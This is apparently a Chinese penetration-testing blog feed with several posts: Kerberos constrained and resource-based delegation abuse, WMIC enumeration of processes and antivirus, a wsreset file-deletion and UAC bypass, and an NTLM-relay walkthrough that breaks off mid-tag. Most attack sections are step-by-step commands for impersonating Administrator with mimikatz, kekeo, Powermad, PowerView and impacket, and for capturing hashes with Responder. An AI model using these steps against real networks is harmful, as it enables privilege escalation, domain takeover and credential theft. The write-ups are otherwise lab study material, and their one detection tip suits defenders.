title="3.约束委派"></a>3.约束委派</h1><h2 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1.原理"></a>3.1.原理</h2><p>由于非约束委派的不安全性，微软在windows server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：</p><ul><li>Service for User to Proxy(S4U2proxy)约束委派</li><li>Service for User to Self(S4U2self)协议转换</li></ul><h3 id="S4U2proxy-约束委派"><a href="#S4U2proxy-约束委派" class="headerlink" title="S4U2proxy(约束委派)"></a>S4U2proxy(约束委派)</h3><p>当用户去带着ST1去访问服务A的时候，服务A如果需要访问服务B，就会使用S4U2Proxy协议将用户发送来的ST1转发给TGS并请求一个ST2。此时TGS会检查服务A的委派属性，如果服务A能够委派给服务B，那么就会返回ST2给服务A，此后服务A会拿着ST2以momo的身份去访问服务B。<br><strong>其实约束委派就是限制了S4U2proxy扩展的范围。配置它后，约束委派将限制服务A能委派的服务范围。而且用的是ST，不至于像TGT那样权限那么大。</strong></p><p><img src="1659267879596-85d93158-638a-4f0f-a594-7e619723a45c.png" alt="img"></p><p>‘</p><h3 id="S4U2self-协议转换"><a href="#S4U2self-协议转换" class="headerlink" title="S4U2self(协议转换)"></a>S4U2self(协议转换)</h3><p>上图中用户是通过Kerberos协议与服务A进行认证的，而当用户以其他方式(如NTLM认证，基于表单的认证等方式)与Web服务器进行认证后，用户是无法向Web服务器提供请求该服务的服务票据ST1的，因而服务器A也无法进一步使用S4U2Proxy协议请求访问服务B。<br>S4U2Self协议便是解决该问题的方案，<strong>被设置为约束性委派的服务能够调用S4U2Self向TGS为任意用户请求访问自身的可转发的服务票据，此后，便可通过S4U2Proxy使用这张TGS向域控制器请求访问B的票据。</strong><br>PS:其实就是如果用户momo通过其他认证渠道过了服务器A的认证，那么服务器A就会通过S4U2Self协议让TGS生成一个momo访问它的ST（ST生成只需要服务账号密码的HASH），即前面的ST1。然后后面的流程都一样了。（常规的kerberos认证是用户需要向TGS证明自己的身份，而这里就是用户直接向服务A去证明自己的身份，不用管kerberos认不认，只要服务A认了就行）<br> <img src="1659268527444-150c1196-fcb5-4390-a4fa-411784d4c89b.png" alt="img"></p><h2 id="3-2-利用"><a href="#3-2-利用" class="headerlink" title="3.2.利用"></a>3.2.利用</h2><p>首先我们给momo设置上约束委派权限（这里已经让momo注册了SPN，前面提过了），并且设置了momo这个服务账号对w2008这台机子的cifs服务的委派（cifs其实就是文件共享访问协议之类的）<br>接着，我们就要尝试通过约束委派从momo这个账号的权限得到w2008的权限了。</p><p><img src="1659269536813-9c6cb888-2910-4fb0-a8e4-d30e79a24127.png" alt="img"></p><p>1、寻找域内的约束性委派服务账号，发现momo这个账号能委派w2008.ruyue.com的cifs服务。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Properties</span> distinguishedname,useraccountcontrol,msds<span class="literal">-allowedto</span> delegateto| <span class="built_in">fl</span></span><br><span class="line">或者</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Properties</span> distinguishedname,useraccountcontrol,msds<span class="literal">-allowedtodelegateto</span>|<span class="built_in">ft</span> <span class="literal">-Wrap</span> <span class="literal">-AutoSize</span> </span><br></pre></td></tr></table></figure><p><img src="1659269681868-2d4f2cd6-9567-49b0-bdd8-a6d237dcd101.png" alt="img"></p><p>2、在想办法搞到momo这个账号的权限后，我们就可以先导出momo账号的TGT，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="1659269775547-cb6ca1ab-bedf-4ebd-a974-f957964d21de.png" alt="img"></p><p>3、利用kekeo工具去使用S4U协议来伪造一个administartor请求服务B的ST2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;e6edd]-2-1-40e10000-momo@krbtgt-RUYUE.COM.kirbi /user:Administrator@ruyue.com /service:cifs/w2008.ruyue.com</span><br></pre></td></tr></table></figure><p><strong>PS：如果有momo这个服务账号的明文密码或者hash也是可以的，不是非要去读票据。</strong></p><p>最终在当前目录下得到两个票据文件，比较长那个就是用于访问服务B的ST2</p><p><img src="1659269825352-c92192d4-06e4-4231-94a3-3f884978e6d8.png" alt="img"></p><p>4、把ST2导入当前会话，就能够成功以Administrator的权限访问服务B了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@ruyue.com@RUYUE.COM_cifs~w2008.ruyue.com@RUYUE.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="1659269848075-0a75cdc2-68ee-46ce-9e80-a21d5b109b7b.png" alt="img"></p><h1 id="4-资源委派"><a href="#4-资源委派" class="headerlink" title="4.资源委派"></a>4.资源委派</h1><p><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86</a></p><h2 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1.原理"></a>4.1.原理</h2><p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能。传统的约束委派是“正向的”，通过修改服务A属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。<br>而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。</p><p>从这里我们可以知道<strong>资源的约束委派并不能危害其他机子，只能对自己进行攻击，也就是说提权操作</strong>。（因为能够模拟其他用户的权限访问自己）</p><h2 id="4-2-条件"><a href="#4-2-条件" class="headerlink" title="4.2.条件"></a>4.2.条件</h2><ul><li>① 谁可以修改机器B的msDS-AllowedToActOnBehalfOfOtherIdentity属性。</li><li>② 机子B具有一个SPN账号（<strong>因为S4U2Self只适用于具有SPN的账户</strong>）</li></ul><p>我们比较关注第一个前提，谁能修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性，</p><p><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86</a></p><p><strong>我们可以得知有两个用户有权限添加这个属性：①带着这台机子进入域的时候的域用户②该机子本身的机器账户。</strong></p><p>接着我们继续看第二个前提，具有一个SPN账号，我们知道注册SPN账号是需要域管权限的，显然一个普通域用户是没有权限去注册SPN的。</p><p>而恰好的是在域中有一个属性MachineAccountQuota，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册RestrictedKrbHost&#x2F;domain和HOST&#x2F;domain这两个SPN的，所以这里正好能够实现前提二。</p><p>因此带它进入域的域用户可以去创建一个新的机器账户来达到获取SPN的目的。</p><h2 id="4-3-利用场景"><a href="#4-3-利用场景" class="headerlink" title="4.3.利用场景"></a>4.3.利用场景</h2><ul><li>提权：模拟其他用户访问自身，通过高权限利用mimikatz抓取本地密码。</li><li>一个公司可能会有一个专门用来加域的账号，虽然这个账户通常只有普通域用户权限，但是如果我们控制了这个账户那么就可以打下一大批机器。</li><li>如果我们想拿域内机器A的权限，如果我们又没有机器A administrators组成员凭据的话还可以看机器A是通过哪个用户加入域的，控制了这个用户依然可以获取权限。</li><li>一个域用户X 可能会在域中创建多台机器(比如笔记本和台式机都需要加入域)，当我们有了域用户X的权限时，可以利用rbcd继续攻击其他mS-DS-CreatorSID是域用户X的机器</li><li>权限维持：①配置evil到krbtgt基于资源的约束委派②配置evil到域控基于资源的约束委派。</li></ul><h2 id="4-4-利用"><a href="#4-4-利用" class="headerlink" title="4.4.利用"></a>4.4.利用</h2><h3 id="4-4-1-搞清带入域者"><a href="#4-4-1-搞清带入域者" class="headerlink" title="4.4.1.搞清带入域者"></a>4.4.1.搞清带入域者</h3><p>资源的约束委派不再需要域管理员权限去设置委派，只需拥有在计算机对象上编辑<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，也就是说：带它进入域的域用户或者机器账号的权限。所以我们第一步是先搞清楚是当前或者目标主机是被谁带入域的</p><p>可使用工具ADfind或者PowerView来获取。</p><p>如下图，就只有TEST11是有这个属性的。也就是说TEST11这台主机是被S-1-5….这个SID对应的用户给带进域的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 192.168.152.128 -b &quot;DC=ruyue,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure><p><img src="1659271402589-8094da89-b8f1-4234-93d0-3476c1ac3c81.png" alt="img"></p><p>接着查看当前用户的，简单对比下，就可以知道momo这个账号有权限去修改TEST11的msDS-AllowedToActOnBehalfOfOtherIdentity属性，也就是说利用momo这个账号可以在TEST11这台机子拿到最高权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity momo -Properties objectsid # 查询</span><br></pre></td></tr></table></figure><p><img src="1659271511312-ffc5593d-27f8-459f-ad97-b44174f81cfe.png" alt="img"></p><h3 id="4-4-2-提权利用"><a href="#4-4-2-提权利用" class="headerlink" title="4.4.2.提权利用"></a>4.4.2.提权利用</h3><p>如果我们没有一个普通域账号，要想利用的话，就需要有机器账号，但一般情况下是没办法拿到机器账号的，但是所有低权限服务(例如network service这类型的本机服务)如果可以请求域资源，那么出网都是以机器账户身份去请求的。所以我们就可以利用这个权限去进行资源委派的利用，模拟一个administrator访问自身，获取高权限。</p><p>如果我们有一个普通域账号（有权限修改msDS-AllowedToActOnBehalfOfOtherIdentity 属性），我们就可以利用这个账号去创建一个机器账号，再利用机器账号做资源委派利用，获取权限。<br><strong>攻击流程：</strong></p><ul><li>利用域账号创建一个机器账号</li><li>修改服务A的msDS-AllowedToActOnBehalfOfOtherIdentity ,配置好机器账号到服务的基于资源的约束委派。（服务A信任机器账号的委派）</li><li>使用机器账号利用S4U2SELF 协议获得ST，再通过S4U2PROXY获得访问A cifs服务的ST2。（和约束委派差不多的流程）</li><li>用ST2访问服务A的CIFS服务，获得权限。</li></ul><h4 id="4-4-2-1-不利于EXP"><a href="#4-4-2-1-不利于EXP" class="headerlink" title="4.4.2.1.不利于EXP"></a>4.4.2.1.不利于EXP</h4><h5 id="4-4-2-1-1-创建机器账号"><a href="#4-4-2-1-1-创建机器账号" class="headerlink" title="4.4.2.1.1.创建机器账号"></a>4.4.2.1.1.创建机器账号</h5><p>首先我们在前面信息收集的时候得知了momo这个账号是能修改test11这台机子的msDS-AllowedToActOnBehalfOfOtherIdentity属性的。因此这里我们就利用momo这个域账号去先创建一个机器账号。<br>使用 Powermad中的 New-MachineAccount 来创建机器账户，如图成功创建一个名为momomachine，密码为777777的机器账号。<br><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount momomachine  -Password $(ConvertTo-SecureString &quot;777777&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="1659271924847-319b31dc-ac0c-41e3-beec-317403baf242.png" alt="img"><img src="1659271933596-f5af5fef-f697-4886-b99c-2d9e5eaa15e0.png" alt="img"></p><h5 id="4-4-2-1-2-设置资源委派"><a href="#4-4-2-1-2-设置资源委派" class="headerlink" title="4.4.2.1.2.设置资源委派"></a>4.4.2.1.2.设置资源委派</h5><p>前面我们创建了机器账号，也就是说成功注册了SPN，接着就可以设置momomachine到test11这台机子的委派了。</p><p>这里还是使用powerview去操作。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Netcomputer</span> momomachine | <span class="built_in">select</span> objectsid <span class="comment">#获取机器账号的sid</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2955859873-908271592-1975121256-1710)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> [目标主机名]| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><p><img src="1659271981632-7a1a84c5-02d2-4495-9cc7-78bac2b11ce1.png" alt="img"></p><p>查看资源委派添加成功与否：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer test11 -Properties msds-allowedtoactonbehalfofotheridentity </span><br></pre></td></tr></table></figure><p><img src="1659272013442-3d859602-001a-43fd-a48a-8fd64635f933.png" alt="img"></p><h5 id="4-4-2-1-3-利用资源委派进行提权"><a href="#4-4-2-1-3-利用资源委派进行提权" class="headerlink" title="4.4.2.1.3.利用资源委派进行提权"></a>4.4.2.1.3.利用资源委派进行提权</h5><p>和约束委派差不多。因为当前机子test11信任了momomachine这个SPN的委派，所以我们就需要先获取这个SPN的ST票据，可是这里我们没导出内存的权限，但别忘记了我们已经有密码了，没必要导出内存，直接用密码向KDC申请ST1，并用这个ST1通过S4U协议来伪造一个administartor请求机器test11的ST2，从而实现提权就完事了。</p><p>PS:这里我还是不用rebeus来搞，毕竟这玩意需要目标机子有.NET环境。</p><p>这里我们使用impacket</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.152.128 ruyue.com/momomachine\$:777777 -spn cifs/test11.ruyue.com -impersonate administrator</span><br></pre></td></tr></table></figure><p><img src="1659272072329-e656748f-f17a-4f2a-926b-9d55f6779380.png" alt="img"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=/usr/mytool/impacket/examples/administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py test11.ruyue.com <span class="literal">-no-pass</span> <span class="literal">-k</span> <span class="literal">-dc-ip</span> <span class="number">192.168</span>.<span class="number">152.128</span></span><br></pre></td></tr></table></figure><p><img src="1659272086515-6fd2c0b0-6f77-453e-8295-7b90e4a06fb0.png" alt="img"></p><p>PS：wmiexec执行一些命令会乱码，所以可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -k -no-pass test11.ruyue.com</span><br></pre></td></tr></table></figure><p><img src="1659272123040-6886524c-8c8c-490d-8aef-4c3a80e3b48c.png" alt="img"></p><h4 id="4-4-2-2-利用EXP"><a href="#4-4-2-2-利用EXP" class="headerlink" title="4.4.2.2.利用EXP"></a>4.4.2.2.利用EXP</h4><p>前面的setp1和step2都可以利用工具完成，如下：</p><p><a href="https://raw.githubusercontent.com/pkb1s/SharpAllowedToAct/1ece255b0979b8b447ca27ce884fcf83bdf9c673/SharpAllowedToAct/Program.cs">https://raw.githubusercontent.com/pkb1s/SharpAllowedToAct/1ece255b0979b8b447ca27ce884fcf83bdf9c673/SharpAllowedToAct/Program.cs</a></p><h4 id><a href="#" class="headerlink" title></a><img src="1659272172248-8f9b2369-4a98-413b-8ded-d66ef398437c.png" alt="img"></h4><p>如图直接执行exp，就完成步骤<code>4.4.2.1.1.</code>和<code>4.4.2.1.2.</code>，接着只需要操作<code>4.4.2.1.3.</code>就完事了。</p><p><img src="1659272189847-3435802e-2734-45b4-82b2-050b499cccfa.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WMIC</title>
      <link href="/2022/07/28/WMIC/"/>
      <url>/2022/07/28/WMIC/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="排查进程树"><a href="#排查进程树" class="headerlink" title="排查进程树"></a>排查进程树</h1><h2 id="1-命令查找"><a href="#1-命令查找" class="headerlink" title="1.命令查找"></a>1.命令查找</h2><p>获取父进程id：parentprocessid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&#x27;进程名&#x27;  get caption,commandline,processid,parentprocessid /value</span><br></pre></td></tr></table></figure><p><img src="1658994012746-0240490e-204d-4905-8a9f-b0cb69f319da.png" alt="img"></p><p>或者<code>wmic process where name=&#39;进程名&#39; get parentprocessid</code></p><p><img src="1658993990484-c93f92aa-ed75-46af-a498-acbcf345eec6.png" alt="img"></p><p>之后根据id去一步一步查找，直至列出关联进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where processid=&#x27;parentprocessid&#x27;  get caption,commandline,processid,parentprocessid /value</span><br></pre></td></tr></table></figure><p><img src="1658994071260-eded5108-e748-4298-b0a5-20be6c32fb31.png" alt="img"></p><p>一直直至没有可用实例</p><p><img src="1658994195334-92f46c9c-45b8-4d84-b0b4-bb4f0711de6f.png" alt="img"></p><h2 id="2-工具-explorer-process"><a href="#2-工具-explorer-process" class="headerlink" title="2 工具-explorer process"></a>2 工具-explorer process</h2><h1 id="获取杀软相关信息"><a href="#获取杀软相关信息" class="headerlink" title="获取杀软相关信息"></a>获取杀软相关信息</h1><h2 id="1-列出杀软"><a href="#1-列出杀软" class="headerlink" title="1.列出杀软"></a>1.列出杀软</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</span><br></pre></td></tr></table></figure><p><img src="1658996465605-9faef166-4fa2-4dd2-b987-72b3e32dbc42.png" alt="img"></p><h2 id="2-列出杀软相关路径"><a href="#2-列出杀软相关路径" class="headerlink" title="2.列出杀软相关路径"></a>2.列出杀软相关路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname,productstate,pathtosignedproductexe</span><br></pre></td></tr></table></figure><p><img src="1658996592340-746f58be-5c67-4726-889e-4983089b8ea3.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wsreset漏洞利用</title>
      <link href="/2021/08/22/Wsreset%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
      <url>/2021/08/22/Wsreset%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Wsreset 是 Windows 中用于清理 Windows 商场缓存及 Cookie 的工具。</p><p>Wsreset 在运行的时候，会删除以下目录中的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%userprofile%\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\AC\INetcache</span><br><span class="line">%userprofile%\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\AC\INetCookies</span><br></pre></td></tr></table></figure><p>而 Wsreset 由于需要处理 Windows 设置，其本身就存在特权运行，所以普通用户可以利用其本身的权限去删除一些需要提升权限才能删除的文件。</p><h2 id="任意文件删除利用："><a href="#任意文件删除利用：" class="headerlink" title="任意文件删除利用："></a>任意文件删除利用：</h2><p>我们知道，在 Windows 中可以通过 mklink 与 New-Item 将目录进行链接。当我们将 INetcache 与想要删除的文件链接之后，我们在执行 Wsreset 的时候，就会删除掉我们链接好的目录。</p><p>首先我们当前用户的对 INetcache 目录是具备完全控制的权限的。</p><p><img src="1595579132432-4cfaba4d-3165-4b41-b04c-24038d49b2cc.png" alt="img"></p><p>假如我们现在要去删除 hosts 文件，可以看到我们是没有权限的</p><p><img src="1595579601875-81150642-5a7d-4d57-96db-a624fb8ca4e3.png" alt="img"></p><p><img src="1595579645336-bf57a111-82b6-4dbc-b33e-ba84934c2ec6.png" alt="img"></p><p>这个时候我们将两个目录进行连接</p><p><img src="1595579906640-a7e6f5e4-6f04-42a5-bbb1-27d0296592e7.png" alt="img"></p><p>然后执行 Wsreset 尝试一下效果，文件已经被删除掉了</p><p><img src="1595580011765-db667a78-3097-47eb-b3e2-b9492ffcc1c9.png" alt="img"></p><h2 id="Bypass-Uac"><a href="#Bypass-Uac" class="headerlink" title="Bypass Uac:"></a>Bypass Uac:</h2><p>首先 Wsreset 具有特权，其次它每次启动的时候，都会访问该注册表 <strong>HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command</strong> 查询是否有需要执行的命令</p><p><img src="1595581265297-b923144f-f217-4918-822c-5809299ceaa7.png" alt="img"></p><p>那么我们可以直接在 default 添加命令字段（该注册键是位于HKCU，这意味着我们当前的用户权限是可以去做更改的）</p><p><img src="1595581343483-f667c6d8-542a-4f27-86d6-7140ec53ae6a.png" alt="img"></p><p>然后执行查看效果，成功bypass uac</p><p><img src="1595581509647-54e10998-d2a1-4d2a-9f7b-6f2e43e9f1f3.png" alt="img"></p><p>同时我们如果修改了这个健值，当我们访问 Windows Store 的时候，当点击任意应用详情页面的时候，都会执行健值中的命令</p><p><img src="1595581670660-0da20a29-ae1d-4e3f-a6ba-dba691bc86cd.png" alt="img"></p><h2 id="检测方案："><a href="#检测方案：" class="headerlink" title="检测方案："></a>检测方案：</h2><p>监控 <strong>HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command</strong> 注册表。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NTLM-RELAY</title>
      <link href="/2021/08/05/NTLM-RELAY/"/>
      <url>/2021/08/05/NTLM-RELAY/</url>
      
        <content type="html"><![CDATA[<hr><p>当LM&#x2F;NTLM 与 NET-NTLM hash密码强度很高，无法破解的时候，我们就可以考虑使用 NTLM-relay 的方式进行利用。</p><h1 id="NET-NTLM-认证流程"><a href="#NET-NTLM-认证流程" class="headerlink" title="NET-NTLM 认证流程"></a>NET-NTLM 认证流程</h1><p>观察NET-NTLM的认证流程，可以很明显的看到，这个认证流程中只有客户端与服务器的交互。</p><p><img src="1627136809989-b60a501c-6d93-4bbb-96fc-29bbb6fa3f6b.svg+xml" alt="img"></p><h1 id="NTLM-relay-流程"><a href="#NTLM-relay-流程" class="headerlink" title="NTLM-relay 流程"></a>NTLM-relay 流程</h1><p>对比两个流程图，其实可以很清晰的看到，攻击端在不同视角拥有不同的身份，对于客户端来说，攻击端充当了服务端的角色，对于服务端来说，攻击端又充当了客户端的角色。当认证成功之后，就冒用了受害者的身份信息。这其实就是一个典型的中间人攻击。</p><p><img src="1627136810062-44035c6a-4e0b-47ad-81bc-5d26fe3141a9.svg+xml" alt="img"></p><h1 id="NTLM-Relay-原理简介"><a href="#NTLM-Relay-原理简介" class="headerlink" title="NTLM-Relay 原理简介"></a>NTLM-Relay 原理简介</h1><p>首先我们都知道，NTLM是Windows验证用户身份的一种机制，同时它也是一种嵌入式的协议，NTLM协议消息的传递依赖于其使用的上层协议，比如SMB、LADP、HTTP、SMTP、POP3 等等。无论上层协议如何，发送的NTLM消息都是相同的。攻击者可以从这些上层协议中提取出NTLM消息。</p><p>而一旦我们截获到了 NET-NTLM 的流量，我们就可以进行重放攻击。所以这个攻击最重要的一步，就是如何去截获 NET-NTLM 的流量。</p><h1 id="NTLM-Relay-攻击演示"><a href="#NTLM-Relay-攻击演示" class="headerlink" title="NTLM-Relay 攻击演示"></a>NTLM-Relay 攻击演示</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows 2008 AD 192.168.1.2</p><p>Windows 7 domain user 192.168.1.100</p><p>Parrot attacker 192.168.1.101</p><h2 id="LLMNR-与-NetBIos-欺骗"><a href="#LLMNR-与-NetBIos-欺骗" class="headerlink" title="LLMNR 与 NetBIos 欺骗"></a>LLMNR 与 NetBIos 欺骗</h2><p>我们先了解一下 Windows 的域名解析顺序</p><p>1.本地 hosts 文件</p><p>2.DNS缓存或DNS服务器</p><p>3.链路本地多播名称解析（LLMNR）和NetBIos名称服务（NetBIos）</p><p>当我们发起域名请求的时候，Windows会首先查看 hosts 文件中是否有该解析，如果没有就会去查看DNS缓存或者请求DNS服务器。如果还没有，就会启用LLMNR和Net-BIos，这个时候客户端就会使用未经过认证的UDP广播到网络中，由于该UDP广播没有认证，并且会广播到整个网络，这个时候，网络中任何机器收到该广播的时候都可以声明自己就是目标机器。</p><p><img src="1627136810134-865703d4-1a17-4919-922e-802e60019ac2.png" alt="img"></p><p>所以当受害者输入任何错误或不存在的主机名的时候，我们就可以通过工具截获到Net-NTLM Hash。</p><p><img src="1627136810212-438efc51-23d0-433d-9819-5813172677fd.png" alt="img"></p><h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><h4 id="1-Responder-绑定网卡建立监听"><a href="#1-Responder-绑定网卡建立监听" class="headerlink" title="1.Responder 绑定网卡建立监听"></a>1.Responder 绑定网卡建立监听</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -f</span><br></pre></td></tr></table></figure><p><img src="1627136810302-90ba4e73-f620-428e-bada-1debbafd5afb.png" alt="img"></p><h4 id="2-受害者访问不存在的主机名"><a href="#2-受害者访问不存在的主机名" class="headerlink" title="2.受害者访问不存在的主机名"></a>2.受害者访问不存在的主机名</h4><p><img src="1627136810396-19126cbb-69ea-49bd-a94b-f86a662b00b0.png" alt="img"></p><h4 id="3-攻击端截获到Net-NTLM-hash"><a href="#3-攻击端截获到Net-NTLM-hash" class="headerlink" title="3.攻击端截获到Net-NTLM hash"></a>3.攻击端截获到Net-NTLM hash</h4><p><img src="1627136810478-e8659c20-55f5-4dc6-b68f-22c503257fc3.png" alt="img"></p><h2 id="WPAD-中间人攻击"><a href="#WPAD-中间人攻击" class="headerlink" title="WPAD 中间人攻击"></a>WPAD 中间人攻击</h2><p>WPAD 网络代理自动发现协议是一种客户端使用DCHP、DNS、LLMNR、NBNS协议来定位一个代理配置文件(PAC)URL的方法。WPAD通过让浏览器<strong>自动发现代理服务器</strong>，查找存放PAC 文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。</p><p>一个典型的劫持方式是利用LLMNR&#x2F;NBNS欺骗来让受害者从攻击者获取PAC文件，PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签从而获得用户的Net-NTLMHash。</p><p>当你的浏览器设置为 “自动检测代理设置” 的情况下，它就会下载攻击者事先准备好的wpad.dat文件，这样一来，客户端的流量就会经过攻击者的机器。</p><p><img src="1627136810578-fce0ae57-0fe8-45fd-bbea-ee42b45ae373.png" alt="img"></p><p>攻击端开启WPAD伪造监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -r on -v -F on -w on</span><br></pre></td></tr></table></figure><p><img src="1627136810662-0451381d-8399-4bf4-8147-6e70a36c0811.png" alt="img"></p><p>一旦启用WPAD，攻击者可以通过伪造 WPAD 服务器的方式，劫持目标流量。</p><p>如图，访问bing.com的时候，浏览器提示我们输入凭据，如果受害者输入了账户密码，那么就能直接被窃取。</p><p><img src="1627136810747-168362b2-9199-469d-bad4-06bcaa9e2fe8.png" alt="img"></p><p>成功获取到 NET-NTLM hash</p><p><img 